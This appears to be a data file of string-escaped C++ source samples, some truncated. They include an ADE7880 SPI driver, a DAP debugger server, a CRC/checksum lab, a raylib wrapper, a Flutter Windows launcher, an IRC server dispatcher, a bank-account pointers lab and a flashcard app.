(val >> 24);\n   uint8_t tbv = (val >> 16);\n   uint8_t cbv = (val >> 8);\n   uint8_t zbv = val & 0xff;\n     digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n\tspi.transfer(hbv);\n\tspi.transfer(tbv);\n\tspi.transfer(cbv);\n    spi.transfer(zbv);\n\t\n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n}\n/* void ADE7880_SPI::write24Register(uint16_t reg, uint32_t val)\n{\n    uint8_t fba = 0x0;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    uint8_t hbv = (val >> 24)& 0xff;\n   uint8_t tbv = (val >> 16)& 0xff;\n   uint8_t zbv = val & 0xff;\n     digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n\t\n    spi.transfer(hbv);\n\tspi.transfer(tbv);\n    spi.transfer(zbv);\n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n} */\nuint8_t ADE7880_SPI::read8Register(uint16_t reg)\n{\n    uint8_t fba = 0x1;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    uint8_t res = 0;\n    digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n    uint8_t rb0 = spi.transfer(0x0); \n    res= rb0;   \n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n    return res;\n}\n\nint16_t ADE7880_SPI::read16Register(uint16_t reg)\n{\n    uint8_t fba = 0x1;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    int16_t res = 0;\n    digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n    uint8_t rb0 = spi.transfer(0x0);\n    uint8_t rb1 = spi.transfer(0x0);\n   \n    res |= rb0;\n    res = (res << 8) | rb1;\n    \n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n    return res;\n}\n\nint32_t ADE7880_SPI::read32Register(uint16_t reg)\n{\n    uint8_t fba = 0x1;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    int32_t res = 0;\n    digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n    uint8_t rb0 = spi.transfer(0x0);\n    uint8_t rb1 = spi.transfer(0x0);\n    uint8_t rb2 = spi.transfer(0x0);\n    uint8_t rb3 = spi.transfer(0x0);\n    res |= rb0;\n    res = (res << 8) | rb1;\n    res = (res << 8) | rb2;\n    res = (res << 8) | rb3;\n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n    return res;\n}\n\n\n\nvoid ADE7880_SPI::runDsp()\n{\n    ADE7880_SPI::write16Register(Run, 1);\n}\nvoid ADE7880_SPI::stopDsp()\n{\n    write16Register(Run, 0);\n}\n\nint ADE7880_SPI::_write16Register(const unsigned int reg, const unsigned int val){\n    return 0;\n}\nint ADE7880_SPI::_write8Register(const unsigned int reg, const uint8_t val){\n    return 0;\n}\nint ADE7880_SPI::_write32Register(const unsigned int reg, const uint32_t val){\n    return 0;\n}\nint ADE7880_SPI::_read32Register(const unsigned int reg){\n    return 0",
    "// Copyright 2019 Google LLC\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     https://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n// hello_debugger is an example DAP server that provides single line stepping\n// through a synthetic file.\n\n#include \"dapDefines.h\"\n#include \"hasMember.h\"\n\n#include <string>\n#include <type_traits>\n#include <vector>\n\n#include <condition_variable>\n#include <cstdio>\n#include <filesystem>\n#include <iostream>\n#include <mutex>\n#include <thread>\n#include <unordered_set>\n\n#include \"verilator.cpp\"\n\n#ifdef _MSC_VER\n#define OS_WINDOWS 1\n#endif\n\n// Uncomment the line below and change <path-to-log-file> to a file path to\n// write all DAP communications to the given path.\n//\n#define LOG_TO_FILE (\"/home/ayan_ch/repos/cs-200/logAyan.txt\")\n\n#ifdef OS_WINDOWS\n#include <fcntl.h> // _O_BINARY\n#include <io.h>    // _setmode\n#endif             // OS_WINDOWS\n\n// Event provides a basic wait and signal synchronization primitive.\nclass Event {\npublic:\n  // wait() blocks until the event is fired.\n  void wait();\n\n  // fire() sets signals the event, and unblocks any calls to wait().\n  void fire();\n\nprivate:\n  std::mutex mutex;\n  std::condition_variable cv;\n  bool fired = false;\n};\n\nvoid Event::wait() {\n  std::unique_lock<std::mutex> lock(mutex);\n  cv.wait(lock, [&] { return fired; });\n}\n\nvoid Event::fire() {\n  std::unique_lock<std::mutex> lock(mutex);\n  fired = true;\n  cv.notify_all();\n}\n\n// main() entry point to the DAP server.\nint main(int argc, char *argv[]) {\n#ifdef OS_WINDOWS\n  // Change stdin & stdout from text mode to binary mode.\n  // This ensures sequences of \\r\\n are not changed to \\n.\n  _setmode(_fileno(stdin), _O_BINARY);\n  _setmode(_fileno(stdout), _O_BINARY);\n#endif // OS_WINDOWS\n\n  std::shared_ptr<dap::Writer> log;\n  if (argc == 2) {\n    std::filesystem::path logFile = argv[1];\n    logFile.replace_filename(\"log.txt\");\n    log = dap::file(logFile.c_str());\n  }\n\n  // Create the DAP session.\n  // This is used to implement the DAP server.\n  auto session = dap::Session::create();\n\n  // Hard-coded identifiers for the one thread, frame, variable and source.\n  // These numbers have no meaning, and just need to remain constant for the\n  // duration of the service.\n  const dap::integer threadId = 100;\n  const dap::integer frameId = 200;\n  const dap::integer variablesReferenceId = 300;\n  const dap::integer sysvariablesReferenceId = 310;\n  const dap::integer sourceReferenceId = 400;\n\n  // Signal events\n  Event configured;\n  Event terminate;\n\n  // Construct the debugger.\n  sim_t sim;\n  std::thread *t = NULL;\n\n  // Event handlers from the Debugger.\n  auto onsim_tEvent = [&](sim_t::Event onEvent) {\n    switch (onEvent) {\n    case sim_t::Event::Stepped: {\n      // The debugger has single-line stepped. Inform the client.\n      dap::StoppedEvent event;\n      event.reason = \"step\";\n      event.threadId = threadId;\n      session->send(event);\n      break;\n    }\n    case sim_t::Event::BreakpointHit: {\n      // The debugger has hit a breakpoint. Inform the client.\n      dap::StoppedEvent event;\n      event.reason = \"breakpoint\";\n      event.threadId = threadId;\n      session->send(event);\n      break;\n    }\n    case sim_t::Event::Paused: {\n      // The debugger has been suspended. Inform the client.\n      dap::StoppedEvent event;\n      event.reason = \"pause\";\n      event.threadId = threadId;\n      session->send(event);\n      break;\n    }\n    case sim_t::Event::BoardUpdate: {\n      // The debugger has updated the board. Inform the client.\n      dap::BoardUpdateEvent event;\n      event.ledArray = sim.ledArray;\n      event.sevenSegment = sim.sevenSegment;\n      session->send(event);\n      break;\n    }\n    }\n  };\n\n  // set the event handlers.\n  sim.registerEventHandlers(onsim_tEvent);\n\n  // Handle errors reported by the Session. These errors include protocol\n  // parsing errors and receiving messages with no handler.\n  session->onError([&](const char *msg) {\n    if (log) {\n      dap::writef(log, \"dap::Session error: %s\\n\", msg);\n      log->close();\n    }\n    terminate.fire();\n  });\n\n  // The Initialize request is the first message sent from the client and\n  // the response reports debugger capabilities.\n  // https://microsoft.github.io/debug-adapter-protocol/specification#Requests_Initialize\n  session->registerHandler([](const dap::InitializeRequest &) {\n    dap::InitializeResponse response;\n    response.supportsConfigurationDoneRequest = true;\n    response.supportsReadMemoryRequest = true;\n    response.supportsSetVariable = true;\n    response.supportsWriteMemoryReques",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <bitset>\n#include <vector>\n\nusing namespace std;\n\n// Define the CRC divisor as a binary string (Example: CRC-16 polynomial)\nconst string crc_divisor = \"10000010000010001\";  // This is equivalent to x^16 + x^10 + x^4 + 1\n\n// Function to perform XOR on two binary strings\nstring xorOperation(const string& dividend, const string& divisor) {\n    string result = \"\";\n    for (size_t i = 1; i < divisor.length(); ++i) {\n        if (dividend[i] == divisor[i]) {\n            result += '0';\n        } else {\n            result += '1';\n        }\n    }\n    return result;\n}\n\n// Function to calculate CRC using bitwise division\nstring calculateCRC(const string& data, const string& divisor) {\n    // Append zeros to the data based on the divisor's length\n    string extendedData = data + string(divisor.length() - 1, '0');\n    \n    size_t pos = divisor.length();\n    string dividend = extendedData.substr(0, divisor.length());\n    \n    while (pos < extendedData.length()) {\n        if (dividend[0] == '1') {\n            dividend = xorOperation(dividend, divisor) + extendedData[pos];\n        } else {\n            dividend = dividend.substr(1) + extendedData[pos];\n        }\n        pos++;\n    }\n    \n    // Handle the remaining bits\n    while (dividend.length() >= divisor.length()) {\n        if (dividend[0] == '1') {\n            dividend = xorOperation(dividend, divisor);\n        } else {\n            dividend = dividend.substr(1);\n        }\n    }\n    \n    return dividend;\n}\n\n// Function to convert binary string to an integer\nunsigned long binaryStringToInt(const string& str) {\n    unsigned int value = 0;\n    for (size_t i = 0; i < str.length(); ++i) {\n        value = (value << 1) + (str[i] - '0'); // Convert binary string to integer bit by bit\n    }\n    return value;\n}\n\n// Function to calculate 16-bit checksum\nstring calculateChecksum(const string& data) {\n    unsigned long sum_value = 0;\n    \n    // Process data in 16-bit blocks\n    for (size_t i = 0; i < data.length(); i += 16) {\n        string block = data.substr(i, 16);  // Extract 16-bit block\n        unsigned long value = binaryStringToInt(block);  // Convert to integer\n        sum_value += value;\n        \n        // Handle overflow (carry over)\n        sum_value = (sum_value >> 16) + (sum_value & 0xFFFF);\n    }\n    \n    // Take one's complement\n    unsigned long checksum = ~sum_value & 0xFFFF;\n    return bitset<16>(checksum).to_string();  // Return 16-bit binary string\n}\n\n// Function to introduce errors using XOR\nstring introduceErrors(const string& data, const string& errorBits) {\n    string result = data;\n    for (size_t i = 0; i < data.length(); ++i) {\n        if (errorBits[i] == '1') {\n            result[i] = (result[i] == '0') ? '1' : '0'; // Flip the bit\n        }\n    }\n    return result;\n}\n\n// Function to print the result (Pass/Not Pass)\nvoid printResult(const string& data, const string& errorBits) {\n    \n    // Append CRC and checksum\n    string crc = calculateCRC(data, crc_divisor);\n    string checksum = calculateChecksum(data);\n    string codeword_crc = data + crc;\n    string codeword_checksum = data + checksum;\n\n    // Introduce errors\n    string received_crc = introduceErrors(codeword_crc, errorBits);\n    string received_checksum = introduceErrors(codeword_checksum, errorBits);\n\n    // Recalculate CRC and checksum for the received data\n    string recalculated_crc = calculateCRC(received_crc.substr(0, data.length()), crc_divisor);\n    string recalculated_checksum = calculateChecksum(received_checksum.substr(0, data.length()));\n\n    // Print results for CRC\n    cout << \"CRC-16\" << endl;\n    cout << \"CRC: \" << crc << \"; \\t\\tResult: \" \n         << ((recalculated_crc == received_crc.substr(data.length())) ? \"Pass\" : \"Not Pass\") \n         << endl;\n\n    // Print results for checksum\n    cout << \"Checksum\" << endl;\n    cout << \"Checksum: \" << checksum << \"; \\tResult: \" \n         << ((recalculated_checksum == received_checksum.substr(data.length())) ? \"Pass\" : \"Not Pass\") \n         << endl;\n}\n\n// Function to read data from file and process each line\nvoid processFile(const string& filename) {\n    ifstream infile(filename.c_str());\n    if (!infile) {\n        cerr << \"Error opening file: \" << filename << endl;\n        return;\n    }\n\n    string data, errorBits;\n    while (infile >> data >> errorBits) {\n        cout << \"=================================\" << endl;\n        cout << \"Data:\" << data << endl;\n        cout << \"Error:\" << errorBits << endl;\n        printResult(data, errorBits);\n    }\n    infile.close();\n}\n\n// Main function\nint main() {\n    // File containing the data and error bits\n    string filename = \"./data.txt\"; // Adjust file path if necessary\n    processFile(filename);\n\n    return 0;\n}\n",
    "#include \"galba.h\"\n\n#include \"raylib.h\"\n\n#include <cstdlib>\n#include <ctime>\n\nColor clear_color = BLACK;\n\nvoid initialize(unsigned int window_width, unsigned int window_height, const std::string& title)\n{\n    InitWindow(window_width, window_height, title.c_str());\n    \n    SetExitKey(0);\n    SetTargetFPS(0);\n\n    SetWindowState(FLAG_VSYNC_HINT);\n\n    srand((unsigned int) time(NULL));\n}\n\nbool is_window_open()\n{\n    BeginDrawing();\n    return !WindowShouldClose();\n}\n\nint get_window_width()\n{\n    return GetRenderWidth();\n}\n\nint get_window_height()\n{\n    return GetRenderHeight();\n}\n\nvoid set_window_title(const std::string& title)\n{\n    SetWindowTitle(title.c_str());\n}\n\nfloat random_float_01()\n{\n    return rand() / (float) RAND_MAX;\n}\n\nfloat random_float_in_range(float min, float max)\n{\n    return random_float_01() * (max - min) + min;\n}\n\nint random_int_in_range(int min, int max)\n{\n    return rand() % (max - min) + min;\n}\n\nconstexpr int key_to_raylib(Key key)\n{\n    switch(key)\n    {\n        case Key::Left: return KEY_LEFT;\n        case Key::Right: return KEY_RIGHT;\n        case Key::Up: return KEY_UP;\n        case Key::Down: return KEY_DOWN;\n        case Key::Space: return KEY_SPACE;\n        case Key::Escape: return KEY_ESCAPE;\n        case Key::Return: return KEY_ENTER;\n    }\n\n    return 0;\n}\n\nconstexpr int button_to_raylib(Button button)\n{\n    switch(button)\n    {\n        case Button::Left: return MOUSE_BUTTON_LEFT;\n        case Button::Right: return MOUSE_BUTTON_RIGHT;\n    }\n\n    return 0;\n}\n\nbool is_key_held_down(Key key)\n{\n    return IsKeyDown(key_to_raylib(key));\n}\n\nbool is_key_pressed(Key key)\n{\n    return IsKeyPressed(key_to_raylib(key));\n}\n\nbool is_key_released(Key key)\n{\n    return IsKeyReleased(key_to_raylib(key));\n}\n\nint get_mouse_x()\n{\n    return (int) GetMousePosition().x;\n}\n\nint get_mouse_y()\n{\n    return (int) GetMousePosition().y;\n}\n\nbool is_button_held_down(Button button)\n{\n    return IsMouseButtonDown(button_to_raylib(button));\n}\n\nbool is_button_pressed(Button button)\n{\n    return IsMouseButtonPressed(button_to_raylib(button));\n}\n\nbool is_button_released(Button button)\n{\n    return IsMouseButtonReleased(button_to_raylib(button));\n}\n\nvoid clear_window()\n{\n    ClearBackground(clear_color);\n}\n\nvoid display()\n{\n    EndDrawing();\n}\n\nvoid set_clear_color(unsigned char r, unsigned char g, unsigned char b)\n{\n    clear_color.r = r;\n    clear_color.g = g;\n    clear_color.b = b;\n    clear_color.a = 255;\n}\n\nvoid set_clear_color(Color color)\n{\n    clear_color.r = color.r;\n    clear_color.g = color.g;\n    clear_color.b = color.b;\n    clear_color.a = color.a;\n}\n\nvoid draw_pixel(int x, int y)\n{\n    DrawPixel(x, y, WHITE);\n}\n\nvoid draw_pixel(int x, int y, Color color)\n{\n    DrawPixel(x, y, color);\n}\n\nvoid draw_pixel(int x, int y, unsigned char r, unsigned char g, unsigned char b, unsigned char a)\n{\n    DrawPixel(x, y, Color{r, g, b, a});\n}\n\nvoid draw_rectangle(int top_left_x, int top_left_y, int width, int height)\n{\n    DrawRectangle(top_left_x, top_left_y, width, height, WHITE);\n}\n\nvoid draw_rectangle(int top_left_x, int top_left_y, int width, int height, Color color)\n{\n    DrawRectangle(top_left_x, top_left_y, width, height, color);\n}\n\nvoid draw_rectangle(int top_left_x, int top_left_y, int width, int height, unsigned char r, unsigned char g, unsigned char b, unsigned char a)\n{\n    DrawRectangle(top_left_x, top_left_y, width, height, Color{r, g, b, a});\n}\n\nvoid draw_circle(int center_x, int center_y, int radius)\n{\n    DrawCircle(center_x, center_y, (float) radius, WHITE);\n}\n\nvoid draw_circle(int center_x, int center_y, int radius, Color color)\n{\n    DrawCircle(center_x, center_y, (float) radius, color);\n}\n\nvoid draw_circle(int center_x, int center_y, int radius, unsigned char r, unsigned char g, unsigned char b, unsigned char a)\n{\n    DrawCircle(center_x, center_y, (float) radius, Color{r, g, b, a});\n}\n\nvoid draw_text(int x, int y, unsigned char r, unsigned char g, unsigned char b, unsigned char a, const std::string& text)\n{\n    DrawText(text.c_str(), x, y, 24, Color{ r, g, b, a });\n}\n\nvoid draw_text(int x, int y, Color color, const std::string& text)\n{\n    DrawText(text.c_str(), x, y, 24, color);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"noteapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ProcessData.cpp                                    :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: mbartos <mbartos@student.42prague.com>     +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/09/17 22:25:17 by orezek            #+#    #+#             */\n/*   Updated: 2024/10/09 12:18:05 by mbartos          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ProcessData.hpp\"\n\nProcessData::ProcessData(Client *client, ClientRequest *clientRequest, ServerData *serverData) : client(client), serverData(serverData), clientRequest(clientRequest)\n{\n\tint clientFd = client->getClientFd();\n\tClientRequestParser parser(*clientRequest);\n\tClientMessage clientMessage = parser.getClientMessage();\n\n\tif (!client->user.getUserValid() || !client->user.getNickValid() || !client->user.getPassSent())\n\t{\n\t\tif (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"CAP\")\n\t\t{\n\t\t\tServerResponse serverResponse;\n\t\t\tserverResponse.setAction(ServerResponse::NOSEND);\n\t\t\tserverResponse.setClientsToSend(clientFd);\n\t\t\tstd::string str = \"\\n\";\n\t\t\tserverResponse.setResponse(str);\n\t\t\tclient->serverResponses.push_back(serverResponse);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"PASS\")\n\t\t{\n\t\t\tPassCommand passCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"NICK\")\n\t\t{\n\t\t\tNickCommand nickCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"USER\")\n\t\t{\n\t\t\tUserCommand userCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"QUIT\")\n\t\t{\n\t\t\tQuitCommand quitCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tServerResponse serverResponse;\n\t\t\tserverResponse.setAction(ServerResponse::SEND);\n\t\t\tserverResponse.setClientsToSend(clientFd);\n\t\t\tstd::string str = \":\" + serverData->getServerName() + \" 451 * \" + clientMessage.getCommandString() + \" :You have not registered.\\n\";\n\t\t\tserverResponse.setResponse(str);\n\t\t\tclient->serverResponses.push_back(serverResponse);\n\t\t}\n\n\t\t// Was Client validated in this loop?\n\t\tUser *user = &(client->user);\n\t\tif (user->getUserValid() && user->getNickValid() && user->getPassSent())\n\t\t{\n\t\t\tServerResponse serverResponse;\n\t\t\tserverResponse.setAction(ServerResponse::SEND);\n\t\t\tserverResponse.setClientsToSend(clientFd);\n\t\t\tif (user->isValidServerUser())\n\t\t\t{\n\t\t\t\tstd::string response = \":\" + serverData->getServerName() + \" 001 \" + user->getNickname() + \" :Welcome to the IRC network, \" + user->getNickname() + \"!\" + user->getUsername() + \"@\" + user->getHostname() + \"\\n\";\n\t\t\t\tresponse.append(\":\" + serverData->getServerName() + \" 002 \" + user->getNickname() + \" :Your host is \" + serverData->getServerName() + \", running version XXXX\\n\");\n\t\t\t\tresponse.append(\":\" + serverData->getServerName() + \" 003 \" + user->getNickname() + \" :This server was created XXXXXXXXXXXXXX\" + \"\\n\");\n\t\t\t\tresponse.append(\":\" + serverData->getServerName() + \" 004 \" + user->getNickname() + \" \" + serverData->getServerName() + \" \\n\");\n\t\t\t\tserverResponse.setResponse(response);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tserverResponse.setResponse(\"Not validated - wrong password\\r\\n\");\n\t\t\t\t// kick user?\n\t\t\t}\n\t\t\tclient->serverResponses.push_back(serverResponse);\n\t\t}\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t// whole command logic will be there\n\t\tif (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"PING\")\n\t\t{\n\t\t\tPingCommand pingCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"PASS\")\n\t\t{\n\t\t\tPassCommand passCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"NICK\")\n\t\t{\n\t\t\tNickCommand nickCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"USER\")\n\t\t{\n\t\t\tUserCommand userCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse if (StringUtils::toUpperCase(clientMessage.getCommandString()) == \"QUIT\")\n\t\t{\n\t\t\tQuitCommand quitCommand(client, *(this->serverData), clientMessage);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tServerResponse serverResponse;\n\t\t\tserverResponse.setAction(ServerResponse::SEND);\n\t\t\tserverResponse.setClientsToSend(clientFd);\n\t\t\tstd::string str = \"Validated user - Response processed by ProcessData class! -: \";\n\t\t\tstr.append(clientRequest->getClientData()",
    "// COMSC 210 | Lab 11 | Winston Jose\n// Github link: https://github.com/winstonjose01/COMS210-Lab11-Pointers-II\n\n\n#include <iostream>\n#include <limits>\n#include <string>\n#include <cctype>\nusing namespace std;\n\n// Global variables\nconst int NO_CUSTOMERS = 3; // No of bank customers\nint total_accounts; // Variable to hold number of bank accts\n\n// Bank customer struct\nstruct BankCustomer{\n    string first_name;          // Customer's first name\n    string last_name;           // Customers's last name\n    int social_security_no;     // Customers last 4 digit SSN\n    int * bank_accounts;        // Customer's bank accout no.\n    double * balance;           // Customer's bank account balance\n    \n    ~BankCustomer() {\n        if (bank_accounts)\n            delete bank_accounts; // Deallocate memory for bank accounts\n        bank_accounts = nullptr;  // Set pointer to nullptr\n        if (balance)\n            delete balance;       // Deallocate memory for balance\n        balance = nullptr;        // Set pointer to nullptr\n\n    }\n};\n// Function declaration\nvoid inputCustomerInfo (BankCustomer *); // Function to input customer info\nvoid printCustomerInfo (BankCustomer *); // Function to print customer info\nbool validateInputInt (int &);           // Validation of integer input\nbool validateInputDouble (double &)      // Validation of string input\n;\nint main(){\n    // Dynamically allocate memory for a array of BankCustomer objects\n    BankCustomer *customers = new BankCustomer[NO_CUSTOMERS];\n\n    // Loop to gather information for each customer\n    for (int i = 0; i < NO_CUSTOMERS; i++){\n        inputCustomerInfo (&customers[i]);\n    }\n    // Loop to print customer information\n    cout << \"-------------------------------------------------\\n\";\n    for (int i = 0; i < NO_CUSTOMERS; i++){\n        printCustomerInfo (&customers[i]);\n    }\n    // Deallocate memory for the customers array\n    delete [] customers;\n\n    return 0;\n}\n\n// This functon will populate the BankCustomer struct with user input\n// Arguments: Struct pointer to a BankCustomer object\n// Returns: No return\nvoid inputCustomerInfo (BankCustomer *cptr){\n    static int numCust = 1;\n    cout << \"\\nEnter the account details for Customer #\" << numCust << \": \\n\";\n\n    cout << \"First Name: \";\n    getline(cin, cptr -> first_name); // Input first name\n\n    cout << \"Last Name: \";\n    getline(cin, cptr -> last_name); // Input last name\n\n    // Input and validate the last 4 digits of SSN \n    cout << \"Last 4 digits of Social Security No: \";\n    while (!validateInputInt (cptr -> social_security_no));\n    // Input qty of account no\n    cout << \"How many account does this customer have: \";\n    cin >> total_accounts;\n    \n    //Dynamically allocate memory for banks account and balance\n    cptr -> bank_accounts = new int[total_accounts];\n    cptr -> balance = new double[total_accounts];\n\n    // Iterate the customer count\n    numCust++;\n\n    // Loop to input the account number and balance\n    for (int i = 0; i < total_accounts; i++){\n        // Input and validate account no\n        cout << \"\\nEnter the account number for #\" << i+1 <<\": \";\n        while(!validateInputInt (cptr -> bank_accounts[i]));\n        // Input and validate balance\n        cout << \"Enter the balance for account number #\" << i+1 <<\": \";\n        while(!validateInputDouble (cptr -> balance[i]));\n\n    cin.ignore(); //Ignore the newline in the buffer\n    }\n}\n\n// This functon will print the BankCustomer struct elements\n// Arguments: Struct pointer to a BankCustomer object\n// Returns: No return\nvoid printCustomerInfo (BankCustomer *cptr){\n    // Display the customer name\n    cout << \"Customer Name : \" << cptr ->first_name << \" \" << cptr -> last_name << \"\\n\";\n    \n    // Display the last 4 digits of SSN\n    cout << \"Last 4 Digits of SSN: \" << cptr ->social_security_no << \"\\n\";\n\n    // Display account numbers and balances\n    cout << \"Accounts and Balance: \\n\";\n    for (int i = 0; i < total_accounts ; i++){\n        cout << \"\\t\" << i + 1 <<\". Account No :\"<< cptr -> bank_accounts[i] << \"\\t|\\t\";\n        cout << \"Balance: $\" << cptr -> balance[i] << \"\\n\";\n    }\n    cout <<\"\\n\";\n}\n// This function validates integer input\n// Arguments: Reference to an integer variable\n// Returns: True if input is valid, false otherwise\nbool validateInputInt(int &input){\n    cin >> input;\n    if (cin.fail()){\n        cin.clear(); // Clear the error flag\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        cout << \"\\nInvalid input. Please enter a valid number :\";\n        return false;\n    }\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n    return true;\n}\n\n// This function validates double input\n// Arguments: Reference to an double variable\n// Returns: True if input is valid, false otherwise\nbool validateInputDouble (double &input){\n    cin >> input;\n    if (cin.fail()){\n        cin.clear(); // Clear the error flag\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        cout << \"\\nInvalid input. Please",
    "\r\n#include <iostream>\r\nusing namespace std;\r\n#include <vector>\r\n#include <stdio.h>      /* printf, scanf, puts, NULL */\r\n#include <cstdlib>  // for rand and srand\r\n#include <fstream>\r\n#include <sstream>\r\n#include \"card.h\"\r\n#include \"csvFunctions.h\"\r\n#include \"account.h\"\r\n#include \"mainFuctions.h\"\r\n#include \"playGame.h\"\r\n\r\n\r\n\r\nint main(){\r\n    int num ; // used for input \r\n    \r\n   \r\n   // choice for loged or make acc \r\n    cout << \"app start screen \" << endl ; \r\n    cout << \"#1 to make an account \\n#2 to login\\nanything else to exit\\n\" ;\r\n    cin >> num; \r\n    cout << endl ; \r\n\r\n    if(num == 1 ){// #1 make and acc \r\n        Account newUser = makeAccount();\r\n        num = 2;\r\n    }\r\n\r\n    if (num == 2){//#2  loged in \r\n        Account user = logIn();                               // user is the name of acc class when loging in \r\n           // Account user= ;\r\n             \r\n            while(true){// main loop\r\n\r\n                cout<< \"#1 make a new card\\n#2 Edit a card\\n#3 Share a set\\n#4 Play a game with a set\\nAnything else to exit\\n  \" << endl ; \r\n                cin >> num; \r\n                cout << endl;\r\n\r\n                if(num == 1 ){ // make card \r\n                    Card newCard = makeNewCard(); // found in main factions \r\n                \r\n                    ofstream file(user.getUserName()+\".csv\", std::ios::app);\r\n                    file << newCard.cardToCsv()+\"\\n\";\r\n                    file.close();\r\n\r\n                }\r\n                else if(num == 2 ){ //edit card\r\n                     editCard(user.getUserName());\r\n                }\r\n                \r\n                else if(num == 3 ){// share a set \r\n                    shareSet(user.getUserName());\r\n\r\n                }\r\n                else if(num == 4 ){// play game\r\n                    cout<< \"#1 View cards in a set (or all)\\n#2 Match cards\\nAnything else to exit\\n  \" << endl ; \r\n                    cin >> num ; \r\n                    cout<<\"\\n\";\r\n\r\n                    if(num == 1){// view cards \r\n                        viewCardsinSet(user.getUserName());\r\n                    }\r\n\r\n                    else if (num ==2 ){// match the cards \r\n                        matchGame(user.getUserName());\r\n                    }\r\n                }\r\n                else {return 0;}\r\n\r\n            }\r\n    }\r\n\r\n    else { // not 1 or 2 \r\n        cout << \"Exiting\" << endl; \r\n        return 0 ; \r\n    }\r\n        \r\n    cout << endl ; \r\n    \r\n    return 0 ;\r\n}",
